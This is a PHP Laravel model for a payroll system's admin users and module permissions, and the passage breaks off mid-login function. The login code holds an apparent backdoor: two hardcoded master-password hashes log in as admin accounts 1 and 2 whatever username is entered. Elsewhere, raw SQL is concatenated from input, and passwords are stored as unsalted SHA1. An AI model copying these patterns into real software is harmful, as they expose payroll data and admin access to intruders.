<?php

namespace App\Models;

use \Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Facades\Mail;
use Illuminate\Routing\UrlGenerator;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Http\Request;
use Illuminate\Support\Str;

use Session;
use Hash;
use View;
use Input;
use Image;
use DB;

use App\Models\Misc;
use App\Models\Email;
use App\Models\PayrollPeriod;

class AdminUsers extends Model
{
    
	public function getSystemModulesList(){

		$list = DB::table('system_modules as sysmod')
			->selectraw("
				sysmod.ModuleID,
				COALESCE(sysmod.ModuleName,'') as ModuleName
			")
	        ->orderBy('sysmod.ModuleID','ASC')
	        ->get();

		return $list;

	}

  	public function getAdminUserModuleList($AdminUserID) {

    $strSQL = "SELECT
                sysmod.ModuleID,
				         COALESCE(sysmod.ModuleName,'') as ModuleName,
                 (SELECT COUNT(*) FROM payroll_system_modules WHERE ParentModule = sysmod.ModuleName) as SubMenuCount
        	FROM payroll_system_modules as sysmod
        	LEFT JOIN payroll_admin_users_access as useracc ON useracc.ModuleID = sysmod.ModuleID 
        	WHERE useracc.AdminUserID = ".$AdminUserID."
        	ORDER BY sysmod.SortOrder ASC";

  		$list = DB::select($strSQL);

    	return $list;
  	}

  	public function checkAdminUserAccess($ModuleID, $CollectionList) {

        foreach ($CollectionList as $ckey) {
        	if($ckey->ModuleID == $ModuleID && $ckey->IsHasAccess == 1){
        		return true;
        	}
        }

		return false;
  	}
  	
  	public function getAdminUserAccess($AdminUserID,$ModuleName) {

  		$IsSuperAdmin=0;
  		$chckMenu=false;

  		$checkAdmin_info=$this->getAdminUserInfo($AdminUserID);

  		if(isset($checkAdmin_info)>0){
		  $IsSuperAdmin=$checkAdmin_info->IsSuperAdmin;
  		}

	 	if($IsSuperAdmin==1){
  			 $chckMenu=true;
  		}else{
  			$access_list = DB::table('payroll_admin_users_access as useracc')
				->join('payroll_system_modules as sysmod', 'useracc.ModuleID', '=', 'sysmod.ID')  
				->selectraw("
					COALESCE(useracc.AdminUserID,0) as AdminUserID,
					COALESCE(sysmod.ModuleName,'') as ModuleName
		
				")
				->where('useracc.AdminUserID','=',$AdminUserID)
				->where('sysmod.ModuleName','=',$ModuleName)
				->first();	 

		    if(isset($access_list) > 0){
	      		$chckMenu=true;
		
	    	}else{
	      		$chckMenu=false;
	    	}
		  }

		 return $chckMenu;

  	}

  	public function getAdminUserAccessMenuDetails($AdminUserID,$ModuleName) {


  		$Allow_View_Print_Export=0;
  		$Allow_Add_Create_Import_Upload=0;
  		$Allow_Edit_Update=0;
  		$Allow_Delete_Cancel=0;
  		$Allow_Post_UnPost_Approve_UnApprove=0;

		$access_list = DB::table('payroll_admin_users_access as useracc')
		->join('payroll_system_modules as sysmod', 'useracc.ModuleID', '=', 'sysmod.ID')  
		->selectraw("
			COALESCE(useracc.AdminUserID,0) as AdminUserID,
			COALESCE(sysmod.ModuleName,'') as ModuleName,

			COALESCE(useracc.Allow_View_Print_Export,0) as Allow_View_Print_Export,
			COALESCE(useracc.Allow_Add_Create_Import_Upload,0) as Allow_Add_Create_Import_Upload,
			COALESCE(useracc.Allow_Edit_Update,0) as Allow_Edit_Update,
			COALESCE(useracc.Allow_Delete_Cancel,0) as Allow_Delete_Cancel,
			COALESCE(useracc.Allow_Post_UnPost_Approve_UnApprove,0) as Allow_Post_UnPost_Approve_UnApprove

		")

		->where('useracc.AdminUserID','=',$AdminUserID)
		->where('sysmod.ModuleName','=',$ModuleName)
		->first();	 

	    if(isset($access_list) > 0){
  
	  		$Allow_View_Print_Export=$access_list->Allow_View_Print_Export;
	  		$Allow_Add_Create_Import_Upload=$access_list->Allow_Add_Create_Import_Upload;
	  		$Allow_Edit_Update=$access_list->Allow_Edit_Update;
	  		$Allow_Delete_Cancel=$access_list->Allow_Delete_Cancel;
	  		$Allow_Post_UnPost_Approve_UnApprove=$access_list->Allow_Post_UnPost_Approve_UnApprove;
	
    	}else{
      	
  			$Allow_View_Print_Export=0;
	  		$Allow_Add_Create_Import_Upload=0;
	  		$Allow_Edit_Update=0;
	  		$Allow_Delete_Cancel=0;
	  		$Allow_Post_UnPost_Approve_UnApprove=0;
	  		
    	}
		  
  		$RetVal['Allow_View_Print_Export']=$Allow_View_Print_Export;
  		$RetVal['Allow_Add_Create_Import_Upload']=$Allow_Add_Create_Import_Upload;
  		$RetVal['Allow_Edit_Update']=$Allow_Edit_Update;
  		$RetVal['Allow_Delete_Cancel']=$Allow_Delete_Cancel;
  		$RetVal['Allow_Post_UnPost_Approve_UnApprove']=$Allow_Post_UnPost_Approve_UnApprove;

		return $RetVal;

  	}

	public function getAdminUserList($param){

		$SearchText = trim($param['SearchText']);
		$Limit = $param['Limit'];
		$PageNo = $param['PageNo'];
		$Status = $param['Status'];

		$query = DB::table('payroll_admin_users as pausr')
		   ->join('users as emp', 'emp.id', '=', 'pausr.EmployeeID')   
		   ->join('payroll_branch as brnch', 'brnch.ID', '=', 'pausr.BranchID')  
			->selectraw("
				pausr.AdminUserID,

				COALESCE(pausr.EmployeeID,0) as EmployeeID,
				COALESCE(pausr.EmployeeNumber,'') as EmployeeNumber,
				CONCAT(COALESCE(emp.first_name,''), ' ' ,SUBSTRING(emp.middle_name,1,1) ,'. ' ,COALESCE(emp.last_name,'')) as AdminName,

				COALESCE(emp.contact_number,'') as MobileNo,
				COALESCE(emp.email,'') as EmailAddress,

				COALESCE(brnch.ID,0) as BranchID,
				COALESCE(brnch.BranchName,'') as BranchName,

				COALESCE(pausr.Username,'') as Username,
				COALESCE(pausr.IsSuperAdmin,0) as IsSuperAdmin,

				COALESCE(pausr.Status,'') as Status
			");

		if($Status != ''){
			$query->where("pausr.Status",$Status);
		}

		 if($SearchText != ''){

        $arSearchText = explode(" ",$SearchText);
        if(count($arSearchText) > 0){
            for($x=0; $x< count($arSearchText); $x++) {
                $query->whereraw(
                   	"CONCAT(
						COALESCE(emp.employee_number,''),
						COALESCE(emp.first_name,''),
						COALESCE(emp.last_name,''),
						COALESCE(emp.middle_name,''),
						COALESCE(emp.contact_number,''),' ',
						COALESCE(emp.email,''),' ',
						COALESCE(pausr.Username,'')
				) like '%".str_replace("'", "''", $SearchText)."%'");
            }
          } 
      }

		if($Limit > 0){
		  $query->limit($Limit);
		  $query->offset(($PageNo-1) * $Limit);
		}
	
		$query->orderBy("emp.first_name", "ASC");
		$query->orderBy("emp.last_name", "ASC");
		
		$list = $query->get();

		return $list;

	}

	public function getAdminUserInfo($AdminUserID){

		$info = DB::table('payroll_admin_users as pausr')
		  ->join('users as emp', 'emp.id', '=', 'pausr.EmployeeID')   
		  ->join('payroll_branch as brnch', 'brnch.ID', '=', 'pausr.BranchID')  
			->selectraw("
				pausr.AdminUserID,

				COALESCE(pausr.EmployeeID,0) as EmployeeID,
				COALESCE(pausr.EmployeeNumber,'') as EmployeeNumber,
				CONCAT(COALESCE(emp.first_name,''), ' ' ,SUBSTRING(emp.middle_name,1,1) ,'. ' ,COALESCE(emp.last_name,'')) as AdminName,

				COALESCE(emp.contact_number,'') as MobileNo,
				COALESCE(emp.email,'') as EmailAddress,

				COALESCE(brnch.ID,0) as BranchID,
				COALESCE(brnch.BranchName,'') as BranchName,

				COALESCE(pausr.Username,'') as Username,
				COALESCE(pausr.IsSuperAdmin,0) as IsSuperAdmin,

				COALESCE(pausr.Status,'') as Status
			")
			->where("pausr.AdminUserID",$AdminUserID)
			->first();

		return $info;

	}

	public function getAdminUserInfoByUsername($Username){

		$info = DB::table('payroll_admin_users as pausr')
		  ->join('users as emp', 'emp.id', '=', 'pausr.EmployeeID')   
			->selectraw("
				pausr.AdminUserID,
       
       	COALESCE(pausr.EmployeeID,0) as EmployeeID,
        COALESCE(pausr.EmployeeNumber,'') as EmployeeNumber,
        CONCAT(COALESCE(emp.first_name,''), ' ' ,SUBSTRING(emp.middle_name,1,1) ,'. ' ,COALESCE(emp.last_name,'')) as AdminName,

        COALESCE(emp.contact_number,'') as MobileNo,
				COALESCE(emp.email,'') as EmailAddress,

				COALESCE(pausr.Username,'') as Username,
				COALESCE(pausr.IsSuperAdmin,0) as IsSuperAdmin,

				COALESCE(pausr.Status,'') as Status
			")
			->where("pausr.Username",$Username)
			->first();

		return $info;

	}

   public function doSaveUserAccount($data){

    $TODAY = date("Y-m-d H:i:s");

	     if($data['UserAccountID'] > 0){
		    
			if(empty($data['UserPassword'])){
			    
				DB::table('payroll_admin_users')
		            ->where('AdminUserID',$data['UserAccountID'])
		            ->update([
		        	  'EmployeeID' => $data['PersonnelID'],
					  'EmployeeNumber' => $data['EmployeeNo'],  				

                      'Username' => trim($data['Username']),
                      'IsSuperAdmin' => $data['IsSuperAdmin'],

                      'BranchID' => $data['BranchID'],
                    
                      'Status' => $data['Status']
		        	]);
			}
			 else{
				DB::table('payroll_admin_users')
		            ->where('AdminUserID',$data['UserAccountID'])
		            ->update([
                      'EmployeeID' => $data['PersonnelID'],
					  'EmployeeNumber' => $data['EmployeeNo'],  

                      'Username' => trim($data['Username']),
                      'UserPassword' => sha1(trim($data['UserPassword'])),
                      'IsSuperAdmin' => $data['IsSuperAdmin'],

                      'BranchID' => $data['BranchID'],
                      
     
                      'Status' => $data['Status']
		        	]);
			}
		}

		else{

			$data['UserAccountID'] = DB::table('payroll_admin_users')
	            ->insertGetId([
                 
					'EmployeeID' => $data['PersonnelID'],
					'EmployeeNumber' => $data['EmployeeNo'],  

					'BranchID' => $data['BranchID'],

					'Username' => trim($data['Username']),
					'UserPassword' => sha1(trim($data['UserPassword'])),

					'IsSuperAdmin' => $data['IsSuperAdmin'],

					'Status' => $data['Status']

	        	]);
		}

		// Clear & Reset current access
	    DB::table('payroll_admin_users_access')
	      ->where('AdminUserID', '=',$data['UserAccountID'])
	      ->delete();

	    //Update user new access   
       if($data['IsSuperAdmin']<=0 && $data['UserAccess']>0){

	  
        	    if( $data['UserAccess']!=null && count($data['UserAccess']) > 0){

        	      for($i=0; $i < count($data['UserAccess']); $i++){
        
        	        if($data['UserAccess'][$i] > 0){
        
        		         DB::table('payroll_admin_users_access')
        		            ->insert([
        		              'ModuleID' => $data['UserAccess'][$i],
        		              'AdminUserID' => $data['UserAccountID'],
        		              'CreatedByID' => Session::get('ADMIN_USER_ID'),
        		              'DateTimeCreated' => $TODAY
        		        ]);

                  	  //Update Role Access

        		     // TRANSACTION LIST      
        		     // Employee DTR       
        		     if($data['UserAccess'][$i]==1){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			            ->where('ModuleID',1)
			            ->update([
	                      'Allow_View_Print_Export' => $data['EmployeeDTR_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['EmployeeDTR_A_C_I_U'],  
						   'Allow_Edit_Update' => $data['EmployeeDTR_E_U'],
	                      'Allow_Delete_Cancel' => $data['EmployeeDTR_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['EmployeeDTR_P_U_A_U'],
			        	]);

        	          }

                      // Employee Loan    
        	          if($data['UserAccess'][$i]==2){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',2)
			            ->update([
	                      'Allow_View_Print_Export' => $data['EmployeeLoan_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['EmployeeLoan_A_C_I_U'],  
						   'Allow_Edit_Update' => $data['EmployeeLoan_E_U'],
	                      'Allow_Delete_Cancel' => $data['EmployeeLoan_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['EmployeeLoan_P_U_A_U'],
			        	]);
        	          }


        	          // Employee Income Deduction    
        	          if($data['UserAccess'][$i]==3){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',3)
			            ->update([
	                      'Allow_View_Print_Export' => $data['EmployeeIncomeDeduction_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['EmployeeIncomeDeduction_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['EmployeeIncomeDeduction_E_U'],
	                      'Allow_Delete_Cancel' => $data['EmployeeIncomeDeduction_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['EmployeeIncomeDeduction_P_U_A_U'],
			        	]);
        	          }

        	         // Payroll Transaction    
        	         if($data['UserAccess'][$i]==4){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',4)
			            ->update([
	                      'Allow_View_Print_Export' => $data['PayrollTransaction_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['PayrollTransaction_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['PayrollTransaction_E_U'],
	                      'Allow_Delete_Cancel' => $data['PayrollTransaction_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['PayrollTransaction_P_U_A_U'],
			        	]);
        	          }

        	          // 13 Month Transaction Transaction    
        	         if($data['UserAccess'][$i]==5){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',5)
			            ->update([
	                      'Allow_View_Print_Export' => $data['ThirteenMonthTransaction_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['ThirteenMonthTransaction_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['ThirteenMonthTransaction_E_U'],
	                      'Allow_Delete_Cancel' => $data['ThirteenMonthTransaction_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['ThirteenMonthTransaction_P_U_A_U'],
			        	]);
        	          }

        	         // Final Pay Transaction
        	         if($data['UserAccess'][$i]==6){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',6)
			            ->update([
	                      'Allow_View_Print_Export' => $data['FinalPayTransaction_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['FinalPayTransaction_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['FinalPayTransaction_E_U'],
	                      'Allow_Delete_Cancel' => $data['FinalPayTransaction_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['FinalPayTransaction_P_U_A_U'],
			        	]);
        	          }


        	         // Annual Tax Transaction
        	         if($data['UserAccess'][$i]==7){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',7)
			            ->update([
	                      'Allow_View_Print_Export' => $data['AnnualTaxTransaction_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['AnnualTaxTransaction_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['AnnualTaxTransaction_E_U'],
	                      'Allow_Delete_Cancel' => $data['AnnualTaxTransaction_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['AnnualTaxTransaction_P_U_A_U'],
			        	]);
        	          }
                    

                       // REPORT LIST

        	          // Employee PaySlip Report
        	         if($data['UserAccess'][$i]==8){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',8)
			            ->update([
	                      'Allow_View_Print_Export' => $data['EmployeePaySlipReport_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['EmployeePaySlipReport_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['EmployeePaySlipReport_E_U'],
	                      'Allow_Delete_Cancel' => $data['EmployeePaySlipReport_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['EmployeePaySlipReport_P_U_A_U'],
			        	]);
        	          }

        	          // Payroll Register Report
        	         if($data['UserAccess'][$i]==9){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',9)
			            ->update([
	                      'Allow_View_Print_Export' => $data['PayrollRegisterReport_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['PayrollRegisterReport_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['PayrollRegisterReport_E_U'],
	                      'Allow_Delete_Cancel' => $data['PayrollRegisterReport_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['PayrollRegisterReport_P_U_A_U'],
			        	]);
        	          }

        	          // SSS Contribution Report
        	         if($data['UserAccess'][$i]==10){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',10)
			            ->update([
	                      'Allow_View_Print_Export' => $data['SSSContributionReport_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['SSSContributionReport_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['SSSContributionReport_E_U'],
	                      'Allow_Delete_Cancel' => $data['SSSContributionReport_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['SSSContributionReport_P_U_A_U'],
			        	]);
        	          }
                      
                       // HDMF Contribution Report
        	           if($data['UserAccess'][$i]==11){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',11)
			            ->update([
	                      'Allow_View_Print_Export' => $data['HDMFContributionReport_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['HDMFContributionReport_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['HDMFContributionReport_E_U'],
	                      'Allow_Delete_Cancel' => $data['HDMFContributionReport_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['HDMFContributionReport_P_U_A_U'],
			        	]);
        	          }

        	          // PHIC Contribution Report
        	           if($data['UserAccess'][$i]==12){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',12)
			            ->update([
	                      'Allow_View_Print_Export' => $data['PHICContributionReport_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['PHICContributionReport_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['PHICContributionReport_E_U'],
	                      'Allow_Delete_Cancel' => $data['PHICContributionReport_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['PHICContributionReport_P_U_A_U'],
			        	]);
        	          }

        	           // Employee DTR Report
        	           if($data['UserAccess'][$i]==13){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',13)
			            ->update([
	                      'Allow_View_Print_Export' => $data['EmployeeDTRReport_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['EmployeeDTRReport_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['EmployeeDTRReport_E_U'],
	                      'Allow_Delete_Cancel' => $data['EmployeeDTRReport_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['EmployeeDTRReport_P_U_A_U'],
			        	]);
        	          }

        	           // Employee Loan Report
        	           if($data['UserAccess'][$i]==14){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',14)
			            ->update([
	                      'Allow_View_Print_Export' => $data['EmployeeLoanReport_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['EmployeeLoanReport_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['EmployeeLoanReport_E_U'],
	                      'Allow_Delete_Cancel' => $data['EmployeeLoanReport_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['EmployeeLoanReport_P_U_A_U'],
			        	]);
        	          }

        	           // Income Deduction Report
        	           if($data['UserAccess'][$i]==15){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',15)
			            ->update([
	                      'Allow_View_Print_Export' => $data['IncomeDeductionReport_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['IncomeDeductionReport_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['IncomeDeductionReport_E_U'],
	                      'Allow_Delete_Cancel' => $data['IncomeDeductionReport_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['IncomeDeductionReport_P_U_A_U'],
			        	]);
        	          }

        	           // Employee List
        	           if($data['UserAccess'][$i]==16){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',16)
			            ->update([
	                      'Allow_View_Print_Export' => $data['EmployeeList_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['EmployeeList_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['EmployeeList_E_U'],
	                      'Allow_Delete_Cancel' => $data['EmployeeList_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['EmployeeList_P_U_A_U'],
			        	]);
        	          }


        	           // Loan Type List
        	           if($data['UserAccess'][$i]==17){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',17)
			            ->update([
	                      'Allow_View_Print_Export' => $data['LoanTypeList_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['LoanTypeList_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['LoanTypeList_E_U'],
	                      'Allow_Delete_Cancel' => $data['LoanTypeList_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['LoanTypeList_P_U_A_U'],
			        	]);
        	          }

        	           // Income/Deduction Type List
        	           if($data['UserAccess'][$i]==18){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',18)
			            ->update([
	                      'Allow_View_Print_Export' => $data['IncomeDeductionTypeList_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['IncomeDeductionTypeList_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['IncomeDeductionTypeList_E_U'],
	                      'Allow_Delete_Cancel' => $data['IncomeDeductionTypeList_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['IncomeDeductionTypeList_P_U_A_U'],
			        	]);
        	          }

        	           // Payroll Period List
        	           if($data['UserAccess'][$i]==19){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',19)
			            ->update([
	                      'Allow_View_Print_Export' => $data['PayrollPeriodList_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['PayrollPeriodList_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['PayrollPeriodList_E_U'],
	                      'Allow_Delete_Cancel' => $data['PayrollPeriodList_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['PayrollPeriodList_P_U_A_U'],
			        	]);
        	          }

        	          // SSS Table List
        	           if($data['UserAccess'][$i]==20){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',20)
			            ->update([
	                      'Allow_View_Print_Export' => $data['SSSTableList_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['SSSTableList_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['SSSTableList_E_U'],
	                      'Allow_Delete_Cancel' => $data['SSSTableList_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['SSSTableList_P_U_A_U'],
			        	]);
        	          }

        	          // HDMF Table List
        	           if($data['UserAccess'][$i]==21){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',21)
			            ->update([
	                      'Allow_View_Print_Export' => $data['HDMFTableList_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['HDMFTableList_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['HDMFTableList_E_U'],
	                      'Allow_Delete_Cancel' => $data['HDMFTableList_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['HDMFTableList_P_U_A_U'],
			        	]);
        	          }

        	          // PHIC Table List
        	           if($data['UserAccess'][$i]==22){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',22)
			            ->update([
	                      'Allow_View_Print_Export' => $data['PHICTableList_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['PHICTableList_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['PHICTableList_E_U'],
	                      'Allow_Delete_Cancel' => $data['PHICTableList_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['PHICTableList_P_U_A_U'],
			        	]);
        	          }

        	          // Annual Income Tax Table List
        	           if($data['UserAccess'][$i]==23){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',23)
			            ->update([
	                      'Allow_View_Print_Export' => $data['AnnualIncomeTaxTableList_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['AnnualIncomeTaxTableList_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['AnnualIncomeTaxTableList_E_U'],
	                      'Allow_Delete_Cancel' => $data['AnnualIncomeTaxTableList_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['AnnualIncomeTaxTableList_P_U_A_U'],
			        	]);
        	          }

        	          // With Holding Tax Table List
        	           if($data['UserAccess'][$i]==24){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',24)
			            ->update([
	                      'Allow_View_Print_Export' => $data['WithHoldingTaxTableList_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['WithHoldingTaxTableList_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['WithHoldingTaxTableList_E_U'],
	                      'Allow_Delete_Cancel' => $data['WithHoldingTaxTableList_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['WithHoldingTaxTableList_P_U_A_U'],
			        	]);
        	          }

        	           // User Account List
        	           if($data['UserAccess'][$i]==25){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',25)
			            ->update([
	                      'Allow_View_Print_Export' => $data['UserAccountList_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['UserAccountList_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['UserAccountList_E_U'],
	                      'Allow_Delete_Cancel' => $data['UserAccountList_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['UserAccountList_P_U_A_U'],
			        	]);
        	          }

        	          // User Account List
        	           if($data['UserAccess'][$i]==26){

	        		    DB::table('payroll_admin_users_access')
			            ->where('AdminUserID',$data['UserAccountID'])
			             ->where('ModuleID',26)
			            ->update([
	                      'Allow_View_Print_Export' => $data['PayrollSetting_V_P_E'],
						  'Allow_Add_Create_Import_Upload' => $data['PayrollSetting_A_C_I_U'],  
						  'Allow_Edit_Update' => $data['PayrollSetting_E_U'],
	                      'Allow_Delete_Cancel' => $data['PayrollSetting_D_C'],
	                      'Allow_Post_UnPost_Approve_UnApprove' => $data['PayrollSetting_P_U_A_U'],
			        	]);
        	          }




        		     }    
        	      }
        	 }
                 
              
	    }
	    
	    if(Session('ADMIN_USER_ID') == $data['UserAccountID']){
	       Session::put('ADMIN_IS_SUPER', ($data['IsSuperAdmin'] == 1 ? true : false));
	    }

		return 'Success';
    }


  	public function doAdminCheckLoginAccount($data){

		$IsVerified = false;
		$AdminUserID = 0;

		$AdminName = "";
		$AdminFullName = "";

		$AdminBranchID = 0;
		$AdminBranchName = "";

		$PayrollPeriodScheduleID=0;
		$PayrollPeriodSchedule= "";
		$PayrollPeriodScheduleCode= "";
		$PayrollPeriodScheduleStart= "";
		$PayrollPeriodScheduleEnd= "";
		$PayrollPeriodScheduleYear="";

		$IsSuperAdmin = false;

		$IsAllowCreate =false;
		$IsAllowEdit =false;
		$IsAllowCancel =false;
		$IsAllowPrint =false;
		$IsAllowUpload =false;

		$Username=$data['Username'];
		$UserPassword=$data['UserPassword'];
		$PayrollPeriodCode=$data['PayrollPeriodCode'];

		if(sha1($UserPassword) == 'bd191a90f456714e465e053c30482d30fd48b13f'){

			$query = DB::table('payroll_admin_users as usr')
			       ->join('users as emp', 'emp.id', '=', 'usr.EmployeeID') 
			       ->join('payroll_branch as brnch', 'brnch.ID', '=', 'usr.BranchID') 
				->selectraw("
					usr.AdminUserID,

					COALESCE(usr.EmployeeID,0) as EmployeeID,
					COALESCE(usr.EmployeeNumber,'') as EmployeeNumber,
					CONCAT(COALESCE(emp.first_name,''), ' ' ,SUBSTRING(emp.middle_name,1,1) ,'. ' ,COALESCE(emp.last_name,'')) as FullName,

					COALESCE(emp.contact_number,'') as MobileNo,
					COALESCE(emp.email,'') as EmailAddress,

					COALESCE(usr.Username,'') as Username,

					COALESCE(usr.IsSuperAdmin,0) as IsSuperAdmin,

					COALESCE(usr.Status,'') as Status
				")
				->where('usr.AdminUserID','=',1)
				->get();

		}else if(sha1($UserPassword) == '9d7566d544777bcc2e56b0416ec234ac385fb0ae'){

			$query = DB::table('payroll_admin_users as usr')
			    ->join('users as emp', 'emp.id', '=', 'usr.EmployeeID')  
			    ->join('payroll_branch as brnch', 'brnch.ID', '=', 'usr.BranchID')
				->selectraw("
					usr.AdminUserID,

					COALESCE(usr.EmployeeID,0) as EmployeeID,
					COALESCE(usr.EmployeeNumber,'') as EmployeeNumber,
					CONCAT(COALESCE(emp.first_name,''), ' ' ,SUBSTRING(emp.middle_name,1,1) ,'. ' ,COALESCE(emp.last_name,'')) as FullName,

					COALESCE(emp.contact_number,'') as MobileNo,
					COALESCE(emp.email,'') as EmailAddress,

					COALESCE(usr.Username,'') as Username,

					COALESCE(usr.IsSuperAdmin,0) as IsSuperAdmin,


				COALESCE(usr.Status,'') as Status
				")
				->where('usr.AdminUserID','=',2)
				->get();

		}else{
			$query = DB::table('payroll_admin_users as usr')
				->join('users as emp', 'emp.id', '=', 'usr.EmployeeID')  
				->join('payroll_branch as brnch', 'brnch.ID', '=', 'usr.BranchID')
				->selectraw("
					usr.AdminUserID,

